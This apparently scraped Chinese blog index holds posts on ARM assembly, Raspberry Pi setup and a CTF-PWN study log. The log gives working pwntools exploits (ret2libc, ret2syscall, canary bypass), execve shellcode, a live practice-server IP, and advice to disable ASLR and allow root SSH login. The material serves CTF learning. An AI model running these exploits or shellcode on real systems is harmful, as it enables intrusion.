存储从R1-R3寄存器的内容到R0寄存器指向的存储单元\n相对寻址\n以程序计数器PC的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到操作数的有效地址。\n1 BL NEXT ····NEXT: ········ ARM和Thumb指令集 基本指令简述 MNEMONIC{S}{condition} {Rd}, Operand1, Operand2\n助记符{是否使用CPSR}{是否条件执行以及条件} {目的寄存器}, 操作符1, 操作符2\nMNEMONIC - 指令的助记符如ADD\n{S} - 可选的扩展位，如果指令后加了S，则需要依据计算结果更新CPSR寄存器中的条件跳转相关 的FLAG {condition} - 如果机器码要被条件执行，那它需要满足的条件标示 {Rd} - 存储结果的目的寄存器 Operand1 - 第一个操作数，寄存器或者是一个立即数 Operand2 - 第二个(可变的)操作数，可以是一个立即数或者寄存器或者有偏移量的寄存器 第二操作数还有如下操作：\n1 2 3 4 5 6 7 #123 - 立即数 Rx - 寄存器比如R1 Rx, ASR n - 对寄存器中的值进行算术右移n位后的值 Rx, LSL n - 对寄存器中的值进行逻辑左移n位后的值 Rx, LSR n - 对寄存器中的值进行逻辑右移n位后的值 Rx, ROR n - 对寄存器中的值进行循环右移n位后的值 Rx, RRX - 对寄存器中的值进行带扩展的循环右移1位后的值 1 2 3 4 ADD R0, R1, R2 - 将第一操作数R1的内容与第二操作数R2的内容相加，将结果存储到R0中。 ADD R0, R1, #2 - 将第一操作数R1的内容与第二操作数一个立即数相加，将结果存到R0中 MOVLE R0, #5 - 当满足条件LE(Less and Equal,小于等于0)将第二操作数立即数5移动到R0中,注意这条指令与MOVLE R0, R0, #5相同 MOV R0, R1, LSL #1 - 将第二操作数R1寄存器中的值逻辑左移1位后存入R0 内存访问相关指令 通常，LDR被用来从内存中加载数据到寄存器，STR被用作将寄存器的值存放到内存中。\n例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 .data /* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*/ var1: .word 3 /* 内存中的第一个变量 */ var2: .word 4 /* 内存中的第二个变量 */ .text /* 代码段开始 */ .global _start _start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1] @ 将R2中的值0x3存放到R1做指向的地址 bkpt adr_var1: .word var1 /* var1的地址助记符 */ adr_var2: .word var2 /* var2的地址助记符 */ 第一种偏移形式：立即数作偏移\n1 2 STR Ra, [Rb, imm] LDR Ra, [Rc, imm] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 .data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1, #2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。 str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1=R1+4。 ldr r3, [r1], #4 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1=R1+4。 bkpt adr_var1: .word var1 adr_var2: .word var2 第二种偏移形式：寄存器作偏移\n1 2 STR Ra, [Rb, Rc] LDR Ra, [Rb, Rc] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 .data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1, r2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1=R1+R2。 ldr r3, [r1], r2 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1=R1+R2。 bx lr adr_var1: .word var1 第三种偏移形式：寄存器缩放值作偏移\n1 2 LDR Ra, [Rb, Rc, \u0026lt;shifter\u0026gt;] STR Ra, [Rb, Rc, \u0026lt;shifter\u0026gt;] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 .data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1, r2, LSL#2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。 str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2\u0026lt;\u0026lt;2。 ldr r3, [r1], r2, LSL#2 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 = R1 + R2\u0026lt;\u0026lt;2。 bkpt adr_var1: .word var1 adr_var2: .word var2 如何区分取址模式：\n如果有一个叹号!，那就是索引前置取址模式，即使用计算后的地址，之后更新基址寄存器。\n如果在外有一个寄存器，那就是索引后置取址模式，即使用原有基址寄存器重的地址，之后再更新基址寄存器\n除此之外，就都是偏移取址模式了\n关于PC相对取址的LDR指令\n有时候LDR并不仅仅被用来从内存中加载数据。还有如下这操作:\n1 2 3 4 5 6 7 8 .section .text .global _start _start: ldr r0, =jump /* 加载jump标签所在的内存位置到R0 */ ldr r1, =0x68DB00AD /* 加载立即数0x68DB00AD到R1 */ jump: ldr r2, =511 /* 加载立即数511到R2 */ bkpt 这些指令学术上被称作伪指令。\n在ARM中使用立即数的规律\n在ARM中不能像X86那样直接将立即数加载到寄存器中。因为你使用的立即数是受限的。\n立即数的值：v = n ror 2*r 有效的立即数都可以通过循环右移来得到\n1 2 3 4 5 6 7 8 9 10 #256 // 1 循环右移 24位 --\u0026gt; 256 #384 // 6 循环右移 26位 --\u0026gt; 384 #484 // 121 循环右移 30位 --\u0026gt; 484 #16384 // 1 循环右移 18位 --\u0026gt; 16384 #2030043136 // 121 循环右移 8位 --\u0026gt; 2030043136 #0x06000000 // 6 循环右移 8位 --\u0026gt; 100663296 (十六进制值0x06000000) Invalid values: #370 // 185 循环右移 31位 --\u0026gt; 31不在范围内 (0 – 30) #511 // 1 1111 1111 --\u0026gt; 比特模型不符合 #0x06010000 // 1 1000 0001.. --\u0026gt; 比特模型不符合 这样并不能一次性加载所有的32位值。不过我们可以通过以下的两个选项来解决这个问题：\n用小部分去组成更大的值。 MOV r0, #511 将511分成两部分：MOV r0, #256, and ADD r0, #255 1 2 3 4 5 6 7 .section .text .global _start _start: mov r0, #256 /* 1 ror 24 = 256, so it\u0026#39;s valid */ add r0, #255 /* 255 ror 0 = 255, valid. r0 = 256 + 255 = 511 */ ldr r1, =511 /* load 511 from the literal pool using LDR */ bkpt 计算立即数的有效值脚本：https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py\n1 2 3 4 5 6 7 azeria@labs:~$ python rotator.py Enter the value you want to check: 511 Sorry, 511 cannot be used as an immediate number and has to be split. azeria@labs:~$ python rotator.py Enter the value you want to check: 256 The number 256 can be used as a valid immediate number. 1 ror 24 --\u0026gt; 256 下面的部分指令用到在详细查，记的话脑壳痛\n跳转指令 B\nBL\nBX\nBXL\n存储器操作指令 LDM\nSTM\nPUSH\nPOP\nSWP\n数据处理 MOV\nMVN\nADD\nADC\nSUB\nRSB\nSBC\nRSC\nMUL\nMLS\nMLA\nUMULL\nUMLAL\nSMUULL\nSMLAL\nSMLAD\nSMLSD\nSDIV\nUDIV\nASR\nAND\nORR\nEOR\nBIC\nLSL\nLSR\nRRX\nROR\nCMP\nCMN\nTSL\nTEQ\n其他指令 SWI\nNOP\nMRS\nMSR\n","date":"2019-08-10T00:00:00+08:00","permalink":"https://ykiko.top/p/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%BE%85%E8%A1%A5%E5%85%85/","title":"ARM汇编基础(待补充)"},{"content":"Raspberry_Pi_3B+_0安装使用 Raspberry Pi 3B+ 0安装使用 0x00 购买 终于下手买了。打算用来学习ARM、以及一些硬件的知识。\n3B+ 裸机\n32G SD card\n散热片\n保护壳\n0x01 安装系统 首先下载系统镜像。\n官网有挺多系统可以选择，这里选择了安装Raspbian desktop最新版\n之后打算装Lite版，手上没有多余的显示器。而且桌面版占用很高。\n迅雷，3分钟搞定。\n其次开始向SD卡中写镜像。\n买的32G闪迪的高速卡，现在32G都白菜价了，想想几年前16G的死贵。\n官方教程用的是Etcher ，也可以用Win32DiskImager。这里省事还是用Etcher。\n步骤\n下载etcher.io安装包安装Etcher](https://etcher.io/)\n运行Etcher,选择镜像和sd卡\nFlash一键搞定。 0x02 配置 系统安装完，开始进行配置。\n先连上显示器看看\n然而平时显示器还是要连笔记本，而且这分辨率好糊。所以还是配ssh和VNC连接使用吧。\n修改源 1 2 3 4 5 6 # 编辑 `/etc/apt/sources.list` 文件，删除原文件所有内容，用以下内容取代： deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib # 编辑 `/etc/apt/sources.list.d/raspi.list` 文件，删除原文件所有内容，用以下内容取代： deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ stretch main sudo apt update\n拓展SD卡 sudo raspi-config -\u0026gt; Advanced Opt -\u0026gt; A1 Expand Filesystem\nssh 配置 最新版系统直接想要的接口打开就OK\n允许root登陆，修改/etc/ssh/sshd.conf 下的PermitRootLogin yes StrictModes yes 就ok。\nVNC win10下载vnc客户端\nRaspberryPI 命令开启server:vncserver\n连接成功：\n连接出现分辨率问题\n设置分辨率：命令sudo raspi-config-\u0026gt;Advanced Opt -\u0026gt;Resolution选择分辨率。重启就完事。\n0x04 硬件检查 系统镜像版本号 板子型号： 系统固件版本号 看看硬件：\nusb cpu 说好的v8?\n网卡 0x05 总结 闲了很久，现在终于动手搞自己想搞的东西，花了一个晚上，搞完这些简单的安装配置，挺费时费力的，不过自己开心就好。最好是自己能够坚持下去，做更多有趣的事。\n12\n","date":"2019-06-23T00:00:00+08:00","permalink":"https://ykiko.top/p/raspberry_pi_3b-_0%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/","title":"Raspberry_Pi_3B+_0安装使用"},{"content":"CTF-PWN刷题记录-CTFWiki_3堆利用（待补充） 简介 ","date":"2019-04-04T00:00:00+08:00","permalink":"https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_3%E5%A0%86%E5%88%A9%E7%94%A8%E5%BE%85%E8%A1%A5%E5%85%85/","title":"CTF-PWN刷题记录-CTFWiki_3堆利用（待补充）"},{"content":"CTF-PWN刷题记录-CTFWiki_2格式化字符串漏洞（待补充） 简介 ","date":"2019-03-22T00:00:00+08:00","permalink":"https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_2%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%BE%85%E8%A1%A5%E5%85%85/","title":"CTF-PWN刷题记录-CTFWiki_2格式化字符串漏洞（待补充）"},{"content":"ROP练习(空) 题目列表： IP:47.106.212.155 ret2libc3\n10008\nret2shellcode\n10002\nret2libc\n10005\ntrain.cs.nctu.edu.tw: rop\n2013-PlaidCTF-ropasaurusrex\nDefcon 2015 Qualifier: R0pbaby\n10012\ntrain.cs.nctu.edu.tw: ret2libc\nAliCTF 2016：vss\nRCTF2015-welpwn\n10010\nlctf16-pwn100\n10011\nxdctf15-pwn200\n10013\nWP（持续更新）：\n","date":"2019-02-28T00:00:00+08:00","permalink":"https://ykiko.top/p/rop%E7%BB%83%E4%B9%A0%E7%A9%BA/","title":"ROP练习(空)"},{"content":"CTF-PWN刷题记录-CTFWiki_1栈溢出 看CTFWiki来入门CTF-PWN (Linux和arm) 做个记录\n知识点：PWN相关知识点总结\nLinux PWN\nARM PWN\n题目全部来源于 CTFWiki 上所涉及题目\nLinux PWN 大部分原理参考CTFWiki\n栈溢出 基本栈溢出 1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void success() { puts(\u0026#34;You Hava already controlled it.\u0026#34;); } void vulnerable() { char s[12]; gets(s); puts(s); return; } int main(int argc, char **argv) { vulnerable(); return 0; } 1 2 3 4 5 6 7 8 # gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1 stack1.c: In function ‘vulnerable’: stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration] gets(s); ^~~~ fgets /tmp/ccNeCYTO.o: In function `vulnerable\u0026#39;: stack1.c:(.text+0x45): warning: the `gets\u0026#39; function is dangerous and should not be used. echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\n关闭完全部保护\n步骤：查看gets()写入的地址距离ebp的长度（计算填充长度）-\u0026gt;+ebp的长度-\u0026gt;+返回的地址（success()的地址)\npoc1.py\n1 2 3 4 5 6 7 8 9 10 11 #coding=utf-8 from pwn import * # sh = process(\u0026#34;./stack1\u0026#34;) sh = remote(\u0026#34;47.106.212.155\u0026#34;,10000) success_addr = 0x08048456 payload = \u0026#39;a\u0026#39;*0x14 + \u0026#39;bbbb\u0026#39; + p32(success_addr) sh.sendline(payload) sh.interactive() 基本ROP ROP 攻击一般得满足如下条件\n程序存在溢出，并且可以控制返回地址。\n可以找到满足条件的 gadgets 以及相应 gadgets 的地址。\nret2text ret2text 即控制程序执行程序本身已有的的代码 (.text)。\n示例程序：ret2text\n所以只需ret到0x0804863a就能getshell\n构造payload\n计算偏移量\n使用ragg2 ragg2 -P 200 -r \u0026gt; pattern.txt or ragg2 -P 200 -r复制下来\n1 2 # ragg2 -P 200 -r AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA# profile.rr2:\n1 2 #!/usr/bin/rarun2 stdin=./pattern.txt r2 -R profile.rr2 -d ret2text or 直接r2 -d ret2text\ndc后输入复制的pattern字符串\nwopO eip得到偏移\ngdb手动计算\n下断点call处：0x080486ae\n所以偏移为108+4\npython pattern.py\npayload\n1 2 3 4 5 6 7 8 from pwn import * # sh = process(./ret2text) sh = remote(\u0026#34;47.106.212.155\u0026#34;,10001) binsh = 0x0804863a payload = 112*\u0026#39;A\u0026#39; + p32(binsh) sh.sendline(payload) sh.interactive() ret2shellcode ret2shellcode\n运行时shellcode所在区域应具有可执行权限 strncpy函数将gets的内容复制到buf2 buf存放到.bss段的[0x804a080:4]位置。\n调试看所在.bss段是否有执行的权限。\npayload:\n1 2 3 4 5 6 7 8 9 10 11 #coding:utf-8 from pwn import * # context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39; ) # sh = process(./ret2shellcode) sh = remote(\u0026#34;47.106.212.155\u0026#34;,10002) ## 获得system(\u0026#34;bin/sh\u0026#34;)的asm shellcode = asm(shellcraft.sh()) buf2_addr = 0x804a080 # sh.sendline(shellcode+\u0026#34;\\x90\u0026#34;*(112-len(shellcode))+p32(buf2_addr)) sh.sendline(shellcode.ljust(112,\u0026#34;A\u0026#34;)+p32(buf2_addr)) sh.interactive() 练习题：sniperoj-pwn100-shellcode-x86-64\n偏移：var void *buf @ rbp-0x10 shellcode可用空间：16+8=24\n找shellcode https://www.exploit-db.com/\nhttp://shell-storm.org/shellcode/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 .global _start _start: # char *const argv[] xorl %esi, %esi # \u0026#39;h\u0026#39; \u0026#39;s\u0026#39; \u0026#39;/\u0026#39; \u0026#39;/\u0026#39; \u0026#39;n\u0026#39; \u0026#39;i\u0026#39; \u0026#39;b\u0026#39; \u0026#39;/\u0026#39; movq $0x68732f2f6e69622f, %rbx # for \u0026#39;\\x00\u0026#39; pushq %rsi pushq %rbx pushq %rsp # const char *filename popq %rdi # __NR_execve 59 pushq $59 popq %rax # char *const envp[] xorl %edx, %edx syscall */ /* gcc -z execstack push64.c uname -r 3.19.3-3-ARCH */ shellcode = \u0026#34;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\u0026#34; \u0026#34;\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#34;; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #coding:utf-8 from pwn import * # context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;x64\u0026#39;,os = \u0026#39;linux\u0026#39; ) io = process(\u0026#39;./shellcode\u0026#39;) # io = remote(\u0026#34;47.106.212.155\u0026#34;,10003) shellcode = \u0026#34;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#34; io.recvuntil(\u0026#39;[\u0026#39;) buf_addr = io.recvuntil(\u0026#39;]\u0026#39;,drop=True) buf_addr = int(buf_addr,16) # print(buf_addr) payload = \u0026#34;A\u0026#34;*24 + p64(buf_addr+32) + shellcode # 32是24字节的填充数据长度加返回地址长度24+8 print payload io.sendline(payload) io.interactive() ret2syscall 控制程序执行系统调用\nret2syscall\n相对ebp的偏移为0x64=108 覆盖范围为+4=112\n没法ret2text,也没法ret2shellcode\n只有使用系统调用来getshell。执行 int 0x80即可执行对应的系统调用\n1 execve(\u0026#34;/bin/sh\u0026#34;,NULL,NULL) 使用ROPgadget寻找gadgets\n这样就能够控制到eax,ebx,ecx,edx寄存器。\n写payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #coding:utf-8 from pwn import * # context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39; ) # io = process(./ret2syscall) io = remote(\u0026#34;47.106.212.155\u0026#34;,10004) pop_eax_addr = 0x080bb196 pop_ebcdx_addr = 0x0806eb90 int_0x80_addr = 0x08049421 bin_sh_addr = 0x080BE408 payload = flat( [\u0026#34;A\u0026#34;*112,pop_eax_addr,0xb,pop_ebcdx_addr,0,0,bin_sh_addr,int_0x80_addr] ) io.sendline(payload) io.interactive() ret2libc ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。\neg1: ret2libc1\n1 2 3 4 5 6 7 8 9 10 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\u0026#34;RET2LIBC \u0026gt;_\u0026lt;\u0026#34;); gets(\u0026amp;s); return 0; } exp1:\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * # io = process(\u0026#39;./ret2libc1\u0026#39;) io = remote(\u0026#34;47.106.212.155\u0026#34;,10006) binsh_addr = 0x08048720 sym_plt_addr = 0x08048460 payload = flat([112*\u0026#39;A\u0026#39;,sym_plt_addr,\u0026#39;b\u0026#39;*4,binsh_addr]) # \u0026#39;bbbb\u0026#39; 作为函数调用栈返回地址的虚假的地址 io.sendline(payload) io.interactive() eg2:\nret2libc2\n缺少/bin/sh 只能自己寻找gadgets来进行构造。\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * # io = process(\u0026#39;./ret2libc2\u0026#39;) io = remote(\u0026#34;47.106.212.155\u0026#34;,10007) # binsh_addr = 0x08048720 sym_plt_addr = 0x08048490 sym_imp_gets_addr = 0x08048460 pop_ebx_addr = 0x0804872f buf2_addr = 0x804a080 payload = flat([\u0026#34;A\u0026#34;*112,sym_imp_gets_addr,pop_ebx_addr,buf2_addr,sym_plt_addr,\u0026#39;x\u0026#39;*4,buf2_addr]) io.sendline(payload) io.sendline(\u0026#34;/bin/sh\u0026#34;) io.interactive() eg3:\nret2libc3\n2的基础上去掉了system的地址。\ngot 表泄露libc的函数地址\n利用思路：\n泄露 __libc_start_main 地址\n获取 libc 版本\n获取 system 地址与 /bin/sh 的地址\n再次执行源程序\n触发栈溢出执行 system(‘/bin/sh’)\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from pwn import * from LibcSearcher import LibcSearcher context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39; ) # io = process(\u0026#39;./ret2libc3\u0026#39;) io = remote(\u0026#34;47.106.212.155\u0026#34;,10008) elf = ELF(\u0026#39;./ret2libc3\u0026#39;) puts_plt = elf.plt[\u0026#39;puts\u0026#39;] start_main_got = elf.got[\u0026#39;__libc_start_main\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] payload = flat([\u0026#34;A\u0026#34;*112,puts_plt,main,start_main_got]) io.sendlineafter(\u0026#34;Can you find it !?\u0026#34;,payload) libc_start_main_addr = u32(io.recv()[0:4]) libc = LibcSearcher(\u0026#39;__libc_start_main\u0026#39;,libc_start_main_addr) libcbase = libc_start_main_addr-libc.dump(\u0026#34;__libc_start_main\u0026#34;) sym_addr = libcbase+libc.dump(\u0026#39;system\u0026#39;) binsh_addr = libcbase+libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = flat([\u0026#34;A\u0026#34;*112,sym_addr,\u0026#34;bbbb\u0026#34;,binsh_addr]) io.sendline(payload) io.interactive() 中级ROP ret2csu 利用 x64 下的 __libc_csu_init 中的 gadgets.\neg:level5:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #undef _FORTIFY_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void vulnerable_function() { char buf[128]; read(STDIN_FILENO, buf, 512); } int main(int argc, char** argv) { write(STDOUT_FILENO, \u0026#34;Hello, World\\n\u0026#34;, 13); vulnerable_function(); } exp:\nret2reg 略 无题目 BROP 略 无二进制 高级ROP ret2_dl_runtime_resolve XDCTF2015-pwn200\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void vuln() { char buf[100]; setbuf(stdin, buf); read(0, buf, 256); } int main() { char buf[100] = \u0026#34;Welcome to XDCTF2015~!\\n\u0026#34;; setbuf(stdout, buf); write(1, buf, strlen(buf)); vuln(); return 0; } //gcc -o bof -m32 -fno-stack-protector bof.c SROP ret2VDSO 花式栈溢出 stack pivoting X-CTF Quals 2016 - b0verfl0w\n转移堆：EkoPartyCTF 2016 fuckzing-exploit-200\nframe faking 2018 安恒杯 over\n直接EXP 分析，，困扰了很久的exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from pwn import * context.binary = \u0026#34;./over.over\u0026#34; def DEBUG(cmd): raw_input(\u0026#34;DEBUG: \u0026#34;) gdb.attach(io, cmd) io = process(\u0026#34;./over.over\u0026#34;) elf = ELF(\u0026#34;./over.over\u0026#34;) libc = elf.libc io.sendafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;a\u0026#39; * 80) stack = u64(io.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6: ].ljust(8, \u0026#39;\\0\u0026#39;)) - 0x70 success(\u0026#34;stack -\u0026gt; {:#x}\u0026#34;.format(stack)) # DEBUG(\u0026#34;b *0x4006B9\\nc\u0026#34;) 96 io.sendafter(\u0026#34;\u0026gt;\u0026#34;, flat([\u0026#39;11111111\u0026#39;, 0x400793, elf.got[\u0026#39;puts\u0026#39;], elf.plt[\u0026#39;puts\u0026#39;], 0x400676, (80 - 40) * \u0026#39;1\u0026#39;, stack, 0x4006be])) libc.address = u64(io.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6: ].ljust(8, \u0026#39;\\0\u0026#39;)) - libc.sym[\u0026#39;puts\u0026#39;] success(\u0026#34;libc.address -\u0026gt; {:#x}\u0026#34;.format(libc.address)) pop_rdi_ret=0x400793 \u0026#39;\u0026#39;\u0026#39; $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \u0026#34;pop|ret\u0026#34; 0x00000000000f5279 : pop rdx ; pop rsi ; ret \u0026#39;\u0026#39;\u0026#39; pop_rdx_pop_rsi_ret=libc.address+0xf5279 payload=flat([\u0026#39;22222222\u0026#39;, pop_rdi_ret, next(libc.search(\u0026#34;/bin/sh\u0026#34;)),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym[\u0026#39;execve\u0026#39;], (80 - 7*8 ) * \u0026#39;2\u0026#39;, stack - 0x30, 0x4006be]) io.sendafter(\u0026#34;\u0026gt;\u0026#34;, payload) io.interactive() Stack smash 35c3 CTF readme\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * addr_ow_flag = 0x600d20 addr_flag = 0x400d20 H,P = \u0026#39;localhost\u0026#39;, 6666 #r = process(\u0026#39;./readme.bin\u0026#39;) r = remote(H,P) junk = r.recvuntil(\u0026#34;What\u0026#39;s your name? \u0026#34;) exploit = \u0026#34;A\u0026#34;*0x218 exploit += p64(addr_flag) exploit += p64(0) exploit += p64(addr_ow_flag) r.sendline(exploit) junk += r.recvuntil(\u0026#34;Please overwrite the flag: \u0026#34;) exploit = \u0026#34;LIBC_FATAL_STDERR_=1\u0026#34; r.sendline(exploit) junk += r.recvall() print junk 栈上partial overwrite 2018 安恒杯 babypie\n2018 XNUCA-gets\nCanary 绕过技术 泄露栈中的Canary\n覆盖 Canary 的低字节，来打印出剩余的 Canary 部分\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // ex2.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; void getshell(void) { system(\u0026#34;/bin/sh\u0026#34;); } void init() { setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); } void vuln() { char buf[100]; for(int i=0;i\u0026lt;2;i++){ read(0, buf, 0x200); printf(buf); } } int main(void) { init(); puts(\u0026#34;Hello Hacker!\u0026#34;); vuln(); return 0; } EXP\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/usr/bin/env python from pwn import * context.binary = \u0026#39;ex2\u0026#39;#全局系统自动设置，为官方推荐设置，ex2为文件名称。 #context.log_level = \u0026#39;debug\u0026#39;#debug模式下才开启 io = process(\u0026#39;./ex2\u0026#39;) #本地连接到ex2 get_shell = ELF(\u0026#34;./ex2\u0026#34;).sym[\u0026#34;getshell\u0026#34;] #由于源码里有getshell函数，所以直接可以使用ELF模块找到getshell函数地址。 io.recvuntil(\u0026#34;Hello Hacker!\\n\u0026#34;)#接受传来的第一部分字符 # leak Canary payload = \u0026#34;A\u0026#34;*100 io.sendline(payload) #传输100个A io.recvuntil(\u0026#34;A\u0026#34;*100) Canary = u32(io.recv(4))-0xa #因为cannary最后一位字节为00被0x0a覆盖，所以减去0x0a log.info(\u0026#34;Canary:\u0026#34;+hex(Canary))#日志记录下canary # Bypass Canary payload = \u0026#34;\\x90\u0026#34;*100+p32(Canary)+\u0026#34;\\x90\u0026#34;*12+p32(get_shell)#发送最后的payload io.send(payload) io.recv() io.interactive() one-by-one 爆破 Canary\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 print \u0026#34;[+] Brute forcing stack canary \u0026#34; start = len(p) stop = len(p)+8 while len(p) \u0026lt; stop: for i in xrange(0,256): res = send2server(p + chr(i)) if res != \u0026#34;\u0026#34;: p = p + chr(i) #print \u0026#34;\\t[+] Byte found 0x%02x\u0026#34; % i break if i == 255: print \u0026#34;[-] Exploit failed\u0026#34; sys.exit(-1) canary = p[stop:start-1:-1].encode(\u0026#34;hex\u0026#34;) print \u0026#34; [+] SSP value is 0x%s\u0026#34; % canary劫持__stack_chk_fail 函数\n覆盖 TLS 中储存的 Canary 